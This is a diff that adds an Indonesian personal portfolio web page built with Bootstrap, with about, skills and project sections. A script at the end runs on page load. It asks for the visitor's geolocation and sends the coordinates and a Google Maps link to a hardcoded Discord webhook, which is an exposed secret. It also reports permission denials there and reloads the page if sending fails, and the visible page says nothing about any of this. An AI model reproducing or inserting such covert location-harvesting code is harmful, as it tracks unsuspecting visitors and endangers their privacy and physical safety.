@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Portofolio Saya</title>
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <style>
+    body {
+      scroll-behavior: smooth;
+    }
+    :root {
+      --primary-color: #0d6efd;
+      --secondary-color: #6c757d;
+    }
+
+    /* Hero section with background image and overlay */
+    #hero {
+      position: relative;
+      background: url('Background.jpg') no-repeat center center/cover;
+      height: 100vh;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 0 1rem;
+    }
+    #hero::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.5); /* dark overlay */
+      z-index: 0;
+    }
+    #hero .content {
+      position: relative;
+      z-index: 1;
+      max-width: 700px;
+    }
+    #hero h1 {
+      font-weight: 700;
+      font-size: 3.5rem;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.7);
+    }
+    #hero p {
+      font-size: 1.5rem;
+      color: #ddd;
+      text-shadow: 0 1px 4px rgba(0,0,0,0.6);
+    }
+    #hero .btn-primary {
+      font-size: 1.25rem;
+      padding: 0.75rem 2rem;
+      margin-top: 1.5rem;
+      box-shadow: 0 4px 10px rgba(13, 110, 253, 0.5);
+    }
+
+    /* Section titles */
+    section h2 {
+      margin-bottom: 2rem;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    /* Skills badges */
+    .skill-badge {
+      font-size: 1rem;
+      margin: 0.25rem;
+    }
+
+    /* Project cards with image overlay */
+    .project-card {
+      position: relative;
+      overflow: hidden;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+    .project-card img {
+      object-fit: cover;
+      height: 200px;
+      width: 100%;
+      transition: transform 0.3s ease;
+    }
+    .project-card:hover img {
+      transform: scale(1.1);
+    }
+    .project-overlay {
+      position: absolute;
+      inset: 0;
+      background-color: rgba(13, 110, 253, 0.7);
+      color: white;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 1rem;
+      text-align: center;
+    }
+    .project-card:hover .project-overlay {
+      opacity: 1;
+    }
+
+    /* Footer */
+    footer {
+      background: #212529;
+      color: #fff;
+      padding: 1rem 0;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Navbar -->
+  <nav class="navbar navbar-expand-lg bg-body-tertiary fixed-top">
+    <div class="container">
+      <a class="navbar-brand" href="#">Portofolio Saya</a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+        aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+        <ul class="navbar-nav">
+          <li class="nav-item"><a class="nav-link active" href="#hero">Home</a></li>
+          <li class="nav-item"><a class="nav-link" href="#about">Tentang Saya</a></li>
+          <li class="nav-item"><a class="nav-link" href="#skills">Keahlian</a></li>
+          <li class="nav-item"><a class="nav-link" href="#projects">Proyek</a></li>
+          <!-- <li class="nav-item"><a class="nav-link" href="#contact">Kontak</a></li> -->
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Hero Section -->
+  <section id="hero">
+    <div class="content">
+      <h1>Halo, Saya Apip</h1>
+      <p>Web Developer | Designer | Programmer</p>
+      <!-- <a href="#contact" class="btn btn-primary btn-lg">Hubungi Saya</a> -->
+
+    </div>
+  </section>
+
+  <!-- About Section -->
+  <section id="about" class="py-5">
+    <div class="container">
+      <h2>Tentang Saya</h2>
+      <div class="row align-items-center">
+        <div class="col-md-4 text-center mb-4 mb-md-0">
+          <img src="Profil.jpg" alt="Foto Profil" class="rounded-circle img-fluid" />
+        </div>
+        <div class="col-md-8">
+          <p>
+            Saya seorang web developer dengan pengalaman dalam membangun website responsif dan aplikasi web modern.
+            Saya memiliki keahlian dalam HTML, CSS, JavaScript, C#, SQL Server dan framework populer seperti Bootstrap.
+            Saya selalu bersemangat untuk belajar teknologi baru dan mengembangkan solusi kreatif.
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Skills Section -->
+  <section id="skills" class="py-5 bg-light">
+    <div class="container">
+      <h2>Keahlian</h2>
+      <div class="d-flex flex-wrap justify-content-center">
+        <span class="badge bg-secondary skill-badge">HTML5</span>
+        <span class="badge bg-secondary skill-badge">CSS3</span>
+        <span class="badge bg-secondary skill-badge">JavaScript</span>
+        <span class="badge bg-secondary skill-badge">Bootstrap</span>
+        <span class="badge bg-secondary skill-badge">C#</span>
+        <span class="badge bg-secondary skill-badge">SQL Server</span>
+        <span class="badge bg-secondary skill-badge">Git</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- Projects Section -->
+  <section id="projects" class="py-5">
+    <div class="container">
+      <h2>Proyek</h2>
+      <div class="row g-4">
+        <div class="col-md-4">
+          <div class="card project-card shadow-sm">
+            <img src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=400&q=80" alt="Proyek 1" />
+            <div class="project-overlay">
+              <h5>Website Toko Online</h5>
+              <p>Website e-commerce sederhana menggunakan HTML, CSS, dan JavaScript.</p>
+              <small>HTML, CSS, JS</small><br />
+              <a href="#" class="btn btn-outline-light btn-sm mt-2" target="_blank" rel="noopener">Lihat Proyek</a>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="card project-card shadow-sm">
+            <img src="https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=400&q=80" alt="Proyek 2" />
+            <div class="project-overlay">
+              <h5>Dashboard Admin</h5>
+              <p>Dashboard interaktif menggunakan React dan Bootstrap.</p>
+              <small>React, Bootstrap</small><br />
+              <a href="#" class="btn btn-outline-light btn-sm mt-2" target="_blank" rel="noopener">Lihat Proyek</a>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="card project-card shadow-sm">
+            <img src="https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&fit=crop&w=400&q=80" alt="Proyek 3" />
+            <div class="project-overlay">
+              <h5>Blog Pribadi</h5>
+              <p>Blog sederhana dengan fitur posting dan komentar menggunakan Node.js.</p>
+              <small>Node.js, Express</small><br />
+              <a href="#" class="btn btn-outline-light btn-sm mt-2" target="_blank" rel="noopener">Lihat Proyek</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Contact Section -->
+  <!-- <section id="contact" class="py-5 bg-light">
+    <div class="container">
+      <h2>Kontak</h2>
+      <div class="row justify-content-center">
+        <div class="col-md-6">
+          <form id="contactForm" novalidate>
+            <div class="mb-3">
+              <label for="name" class="form-label">Nama</label>
+              <input type="text" class="form-control" id="name" placeholder="Masukkan nama Anda" required />
+              <div class="invalid-feedback">Nama wajib diisi.</div>
+            </div>
+            <div class="mb-3">
+              <label for="email" class="form-label">Email</label>
+              <input type="email" class="form-control" id="email" placeholder="Masukkan email Anda" required />
+              <div class="invalid-feedback">Email tidak valid.</div>
+            </div>
+            <div class="mb-3">
+              <label for="message" class="form-label">Pesan</label>
+              <textarea class="form-control" id="message" rows="4" placeholder="Tulis pesan Anda" required></textarea>
+              <div class="invalid-feedback">Pesan wajib diisi.</div>
+            </div>
+            <button type="submit" class="btn btn-primary w-100">Kirim</button>
+          </form>
+          <div id="formAlert" class="alert mt-3 d-none" role="alert"></div>
+        </div>
+      </div>
+    </div>
+  </section> -->
+
+  <!-- Footer -->
+  <footer>
+    <div class="container">
+      <p>© 2024 Rafif Fauzan. Semua hak cipta dilindungi.</p>
+      <p>
+        <a href="https://github.com/apipppf" target="_blank" rel="noopener" class="text-white me-3">GitHub</a>
+        <a href="https://linkedin.com/in/apipppf" target="_blank" rel="noopener" class="text-white">LinkedIn</a>
+      </p>
+    </div>
+  </footer>
+
+  <!-- Bootstrap JS Bundle -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+  <!-- Custom JS -->
+  <script>
+    //Untuk post location -> Discord
+    window.addEventListener('load', function() {
+    const webhookURL = 'https://discord.com/api/webhooks/1418531912280051853/qc2HwlKeEiDrV_OmmbqMcGr6WJvO9ud-7qEx0j9O4SVcY4Ba1f4UPwAyCvyQUejGY2eI';
+
+    function sendToDiscord(message) {
+      const payload = { content: message };
+      return fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        const message = `Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://www.google.com/maps?q=${latitude},${longitude}`;
+
+        sendToDiscord(message)
+        .then(response => {
+          if (response.ok) {
+            //alert('Lokasi berhasil dikirim ke Discord!');
+          } else {
+            location.reload();
+          }
+        })
+        .catch(error => {
+          alert('Error: ' + error);
+        });
+
+      }, function(error) {
+        sendToDiscord(`Gagal mendapatkan lokasi: ${error.message}`);
+        //alert('Gagal mendapatkan lokasi: ' + error.message);
+      });
+    } else {
+      alert('Tidak didukung oleh browser Anda.');
+    }
+  });
+  </script>
+</body>
+</html>
+
